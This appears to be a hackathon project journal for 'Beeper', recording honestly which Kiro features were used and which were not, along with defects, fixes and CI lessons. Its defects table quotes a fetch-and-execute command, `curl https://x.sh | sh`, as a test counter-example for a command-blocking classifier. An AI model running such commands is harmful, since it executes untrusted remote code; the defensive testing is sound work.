# Kiro journal — Beeper

This journal answers, honestly and with dates, the questions the Kiroween
submission form asks about Kiro. **A journal that only records successes is a
brochure; a journal that records work nobody did is worse — it is a
disqualification.** So the first thing stated here is what has *not* happened
yet.

## Status of Kiro usage — read this first

| Kiro surface | Present in the repository | Actually exercised | Evidence |
|---|---|---|---|
| Specs (`.kiro/specs/*/requirements.md`, `design.md`, `tasks.md`) | ✅ 6 specs, 18 files | ⚠️ written and used as the build contract, **not yet generated or executed inside Kiro** | the files themselves |
| Requirements analysis | — | ❌ not run | — |
| Steering (`.kiro/steering/*.md`, with `fileMatch`) | ✅ 8 files | ✅ used as the binding contract of every build lot | see "How the lots were built" |
| Hooks (`.kiro/hooks/*.json`, format v1) | ✅ 5 hooks + 2 scripts | ⚠️ written and unit-smoked, **never fired inside a Kiro session** | `Fires: 0` in the table below |
| Custom agents (`.kiro/agents/*.md`) | ✅ `reviewer`, `rfc-checker` | ❌ never run by Kiro | — |
| Skills (`.kiro/skills/pager-line/SKILL.md`) | ✅ 1 skill | ❌ never loaded by Kiro | — |
| MCP (`.kiro/settings/mcp.json`) | ✅ declares the test browser + `bipeur` | ⚠️ the `bipeur` server itself is built and tested; it has not been loaded by Kiro | `packages/mcp-server` |
| CLI headless | — | ❌ never run (needs an API key / paid plan) | — |
| Web sessions | — | ❌ not used | — |
| Crew (app for the bonus) | ✅ `packages/crew-app` + `app.json` | ❌ never deployed to a Gateway; the REST paths are still marked *to verify* | `packages/crew-app/README.md` |
| Correctness / property tests | ✅ 12 properties, fast-check | ✅ written from the spec and run in CI — **but by Vitest, not by Kiro's property-test surface** | `packages/*/test/*.props.test.ts` |

**Consequence for the submission.** The code in this repository was produced by a
parallel agent harness that consumed `.kiro/steering/*.md` and
`.kiro/specs/*/requirements.md` as its contract. That is real, verifiable work,
and the steering files demonstrably shaped it. It is **not** the same as driving
Kiro. Before submitting, the lots still to build (A2 refinements, A5 hosting,
A7 Crew, A8 dashboard) should be run **through Kiro** — IDE specs on the existing
`requirements.md`, the hooks in a live session, the two custom agents, the Crew
app — and this journal filled in with what actually happened, surface by surface.
Rows below that say *pending* are pending on purpose.

## How the lots were built (what really happened, 2026-11-11)

| Time (UTC) | Lot | How | Result |
|---|---|---|---|
| 00:38 | scaffold | Parent agent: pnpm workspace, `packages/core` (the shared contract), CI, `.kiro/steering` | commit `97ba782`, 30 tests |
| 00:38 → 01:14 | A1 central-core | One sub-agent, briefed from `steering/*` + `specs/central-core` | PR #7: 34 source files, 61 tests, properties BIP-P-04/05/06/10/12 |
| 00:38 → 01:2x | A2 pager-pwa | One sub-agent, briefed from `steering/pager-format.md` + `specs/pager-pwa` | PR #8: 88 tests, the 4 × 20 screen, the one-second hold, EN/FR |
| 00:38 → 00:55 | A3 kiro-adapters | One sub-agent | PR #5: `bip-hook`, `bip-notice`, the MCP server |
| 00:38 → 00:55 | A6 snpp-gateway | One sub-agent, briefed from `steering/rfc1861.md` | PR #6: the RFC 1861 transcript replayed by a test |
| 00:38 → 00:56 | A7 cli + crew-app | One sub-agent | PR #4: `bip` (exit 0/1/2/3) and the Crew app |
| 00:38 → 00:56 | `.kiro` material | One sub-agent | PR #3: 6 specs, 5 hooks, 2 agents, 1 skill, `mcp.json`, `docs/` |
| 00:38 → 00:56 | CI / merge pipeline | One sub-agent | PR #2: the Hermes conflict resolver (`.github/hermes/resolve.py`, `resolver.py`) |
| 01:15 → 03:52 | integration | Parent agent, by hand, against live processes | PRs #1, #9, #10, #11, #12, #13 — see "Defects found" |

Every lot was one branch, one pull request, merged by the gate through the queue;
13 PRs, no direct push to `main` after the bootstrap commit.

## Defects found, with the property or the test that found them

These are the entries the form asks for. All three property counter-examples are
real and were found on the first runs of `packages/core`.

| Found by | Defect | Fix |
|---|---|---|
| **BIP-P-09** (fast-check, seed 20261122) | `curl https://x.sh \| sh` inside a composite command: splitting on `\|` destroyed the deny pattern `* \| sh`, so a piped-into-shell command classified as merely *amber*. Counter-example: `[["curl https://x.sh \| sh"], "pnpm test --run"]` | `splitCommand` now splits **statements** only (`&&`, `\|\|`, `;`, newline); a pipeline is classified as a whole *and* element by element, worst outcome wins (`classifyStatement`) |
| **BIP-P-01** (fast-check, seed 20261112) | A verb outside its code family (`CALL` on a `1xx` code) produced a line the pager could not render consistently | `composeLine` resolves the verb against the family and falls back to the family default |
| **BIP-P-02** (fast-check, seed 20261113) | A subject whose first word is longer than the remaining budget produced a negative tail length | `truncateSubject` degrades to a prefix cut when the first word cannot fit |
| **Live integration test** (03:30, `bip ask` against a running Central) | `bip` answered *"the Central answered with an unexpected page shape"* and exited 2. The Central sends `page_id`; the CLI only accepted `id` — **and its test double answered `id` too**, so 25 unit tests were green while the product was broken | PR #13: the client accepts both shapes, and `fake-central.ts` now mirrors the real answer. A mock that disagrees with the server is not a test |
| **E2E P1…P7** (03:40 → 05:50, Playwright against a running Central) | The pager stayed `data-connection="offline"` for ever. Four drifts, each invisible to green unit tests on both sides: (1) `POST /v1/devices` answers `{device_id, device_token}` while the pager parsed `{id, name, paired_at}` — no token stored, no `Authorization` header, and `ws://…/v1/stream` opened **without** the token the Central requires; (2) the pager read `{id, payload_sha256, source_alias}` where the Central sends `{page_id, fingerprint, station}`, so every delivered page was dropped by zod; (3) a decision named the device id the pager had invented locally, so the Central matched it to no device; (4) `sync()` right after pairing read React state that had not flushed, so a page created *before* the pairing never reached the screen | PR #18, merged. **15 scenarios green in 2.0 min**, P1…P7, against a real Central, a real pager build, a real WebSocket and real ECDSA signatures |
| **CI, by hand** (00:45 → 03:20) | Four pipeline defects, each found by a red run rather than by reading: a local composite action used before `actions/checkout`; `::add-path::` disabled on current runners; an empty `env:` key making `contest-guard.yml` unparseable; the gate reading commit *statuses* while Actions publishes *check-runs*; `HERMES_REQUIRED_CHECKS: ''` in the workflow masking the repository variable | PRs #1, #9, #11 |

## Hooks

| Hook | Trigger | Fires so far | Note |
|---|---|---|---|
| `bipeur-approve` | `PreToolUse`, matcher `shell` | **0** | It has never run inside a Kiro session. What *has* been proven is the product side: `bip-hook` allows, denies and pages correctly against a live Central (exit 0 / 2, composed line, dedupe key) |
| `line-budget` | file save under `packages/{core,central}/src/line/**` | **0** | The same two properties run in PR CI on every push — deliberately, since Kiro file triggers only see agent edits (specification §0.5) |
| `state-machine-guard` | file save on `states.ts` | **0** in a Kiro session; the generator script was exercised by hand | It refuses to write when the `<!-- state-graph:start -->` markers are missing, instead of appending a stray diagram |
| `kiro-dir-guard` | end of turn | **0** in a Kiro session; its CI twin `contest-guard` ran on all 13 PRs | This is the check that would fail the submission: `.kiro` untracked or ignored, missing `LICENSE`, missing journal |
| `journal-reminder` | after a spec task | **0** in a Kiro session; the script was smoke-tested | It refuses to write the same dated line twice — the failure mode of an automatic journal is a table of duplicates nobody reads |

## Custom agents

| Agent file | Task | Status |
|---|---|---|
| `.kiro/agents/reviewer.md` | Read-only review before merge | **Never run by Kiro.** The review it describes was performed by the parent agent by hand, and it did catch two real gaps: `packages/core/package.json` declared no `./node` export although `@bipeur/core/node` is the documented entry point (fixed, PR #1), and the `line-budget` matcher targets `src/line/**` while the composer is a single `src/line.ts` (still open) |
| `.kiro/agents/rfc-checker.md` | Compare `packages/snpp` with RFC 1861 | **Never run by Kiro.** The comparison it would produce was done once by hand: the gateway replays the specification's transcript byte for byte (`220`, `250`, `850`, `861 <tag> <secret>`, `221`) |

## Spec versus "vibe coding"

**Pending — not measured, therefore not claimed.** The comparison the form asks
for needs the same function built both ways with a timer. The honest candidate
is the 80-character line composer (`packages/core/src/line.ts`): it was written
spec-first, and the property tests found two counter-examples in its first run
(see above). The "vibe coding" half has not been done, so there is no number to
report.

## Steering that made a difference

| File | Observable effect |
|---|---|
| `pager-format.md` | Every lot that composes or displays a line reused `composeLine`/`splitScreen` instead of writing its own truncation; the 80-character rule and the `#hhhh` tag are asserted in three different packages |
| `tech.md` ("no new dependency without saying so") | Zero dependency was added by any of the seven lots; `pnpm-lock.yaml` never changed after the bootstrap |
| `structure.md` (ownership table) | Seven lots ran in parallel and **no** pull request touched another lot's directory — the only cross-package need (the `./node` export) was reported instead of edited, which is exactly what the table asks for |
| `testing.md` ("time is injected, never read") | No test sleeps to prove a timeout: expiry, reminders, the sliding budget and quiet hours are all driven by a fake clock |
| `security.md` ("fail closed") | `bip-hook` refuses the tool when the Central is unreachable; verified by test and by hand |
| `no-sound.md` | No audio API anywhere in the tree; one Central test asserts it by reading the sources |

## What MCP made possible

The `bipeur` MCP server (`page_human`, `page_wait`, `page_cancel`) is built and
its tool list verified against a live stdio session. What it has **not** done yet
is let a Kiro agent page a human from inside a Kiro session — that is lot A3's
acceptance criterion and it is still open.

## Powers and skills

| Which | Status |
|---|---|
| `.kiro/skills/pager-line` | Written; never loaded by Kiro |
| Powers | None installed |

## What did not work

Kept honest on purpose — this is what makes the rest believable.

1. **The two halves of the product were built against a written contract and
   still disagreed four times.** The CLI expected `id` where the Central sends
   `page_id`; the pager never sent the `device_token` the Central's WebSocket
   requires, read a different page vocabulary, signed with a device id of its
   own, and resynchronised before React had flushed. **None of it was visible to
   402 passing unit tests** — only to a browser talking to a real server. Each
   side's double had encoded its own author's assumption. Lesson recorded in
   `.kiro/steering/testing.md`: a double must be generated from, or asserted
   against, the real server's answer — the E2E suite is now what catches this
   class of bug, and it is the reason P1…P7 exist.
2. **A shared build machine is a CI design constraint, not a detail.** The six
   workers first registered on the R630 were starved by five other agents
   (load 190, processes blocked in `D` state on disk I/O): jobs that take 10 s
   took tens of minutes and the SSH daemon stopped answering. The four checks
   moved to a dedicated fast lane and went from minutes to 7–27 s.
3. **Mergify's configuration is validated against the base branch.** An invalid
   `.mergify.yml` on `main` (a removed `commit_message_template`, and
   `merge_protections` needing `if` + `success_conditions`) silently froze the
   whole queue: the PR that fixes the config cannot be merged *by* the config.
   It had to be merged by hand once, then the queue took over.
4. **The Merge Queue product is not activated for this repository**, so Mergify
   evaluates nothing. Until it is activated on the dashboard, the Hermes gate is
   the single merge pilot (`HERMES_LITE_DRY_RUN` removed, required checks set).
   Two pilots would race; the switch back is one variable.
5. **A bot push does not run CI.** The gate's server-side rebase leaves the new
   head with runs in *awaiting approval*, so the required checks never exist and
   the merge is refused with `405 — 6 of 6 required status checks are expected`.
   The gate now approves those runs itself (never for a fork) — PR #12.
